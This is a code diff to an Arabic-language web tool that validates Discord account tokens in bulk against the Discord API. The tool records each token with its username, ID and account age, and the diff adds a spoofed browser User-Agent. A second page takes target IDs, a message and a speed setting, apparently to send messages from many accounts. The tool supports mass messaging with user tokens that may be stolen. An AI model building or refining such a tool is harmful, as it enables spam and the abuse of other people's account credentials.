@@ -63,14 +63,14 @@
   <h1>Nasser 497©</h1>
 
   <div id="page1">
-    <textarea id="tokens" rows="10" placeholder="اكتب التوكنات، كل توكن بسطر  :\n"></textarea><br>
+    <textarea id="tokens" rows="10" placeholder="اكتب التوكنات، كل توكن بسطر\nمثال:\nMTAxMjM0NTY3ODkwMTIzNDU2Nw.Gabcd.abcde123456\nMTAxMjM0NTY3ODkwMTIzNDU2Nw.Gefgh.abcdef654321\n"></textarea><br>
     <button id="nextBtn">التالي</button>
     <div id="tokenStatus"></div>
   </div>
 
   <div id="page2" class="hidden">
-    <textarea id="ids" rows="3" placeholder="اكتب الايديات (مفصولة بفاصلة)  :\n"></textarea><br>
-    <input type="text" id="message" placeholder="قم بوضع الكلام : "><br>
+    <textarea id="ids" rows="3" placeholder="اكتب الايديات (مفصولة بفاصلة)"></textarea><br>
+    <input type="text" id="message" placeholder="قم بوضع الكلام"><br>
     <select id="speed">
       <option value="1">1</option>
       <option value="0.9">0.9</option>
@@ -96,8 +96,8 @@
     const tokenStatus = document.getElementById('tokenStatus');
 
     nextBtn.onclick = async () => {
-      const raw = tokensInput.value.trim().replace(/\s+/g, '\n');
-      const tokens = raw.split('\n');
+      const raw = tokensInput.value.trim();
+      const tokens = [...new Set(raw.split(/\s+/).filter(t => t.length > 10))];
       const validTokens = [];
       tokenStatus.textContent = 'جاري التحقق من التوكنات...';
 
@@ -106,10 +106,15 @@
       for (const token of tokens) {
         try {
           const res = await fetch('https://discord.com/api/v10/users/@me', {
-            headers: { Authorization: token }
+            headers: {
+              Authorization: token,
+              'Content-Type': 'application/json',
+              'User-Agent': 'Mozilla/5.0'
+            }
           });
+          const text = await res.text();
           if (res.ok) {
-            const data = await res.json();
+            const data = JSON.parse(text);
             const createdAt = new Date((BigInt(data.id) >> 22n) + 1420070400000n);
             const ageDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
             const msg = `توكن الحساب : ${token}\nيوزور الحساب : ${data.username}#${data.discriminator}\nايدي الحساب : ${data.id}\nعدد ايام الحساب : ${ageDays}`;
@@ -123,7 +128,7 @@
             validTokens.push(token);
             statusText += `✅ صحيح: ${token}\n`;
           } else {
-            statusText += `❌ خاطئ: ${token}\n`;
+            statusText += `❌ خاطئ: ${token}\nسبب Discord: ${text}\n`;
           }
         } catch (err) {
           statusText += `❌ خطأ بالشبكة: ${token}\n`;
